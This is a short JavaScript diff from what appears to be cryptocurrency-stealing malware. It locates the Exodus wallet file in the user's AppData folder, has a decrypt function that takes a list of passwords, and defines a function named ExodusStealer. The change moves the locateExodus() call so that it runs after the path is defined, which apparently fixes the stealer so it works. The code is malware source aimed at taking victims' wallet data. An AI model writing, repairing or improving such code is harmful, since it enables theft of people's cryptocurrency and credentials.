@@ -15,7 +15,7 @@ function decrypt(secoPath, passwords) {
 }
 
 const path = require('path');
-const exodusInfo = locateExodus();
+
 
 function locateExodus() {
     const ExodusPath = path.join(process.env.appdata, "exodus", "exodus.wallet")
@@ -35,6 +35,7 @@ function locateExodus() {
 
 }
 const ExodusPath = path.join(process.env.appdata, "exodus", "exodus.wallet")
+const exodusInfo = locateExodus();
 
 function ExodusStealer(passwords) {
     if (exodusInfo.exodus) {
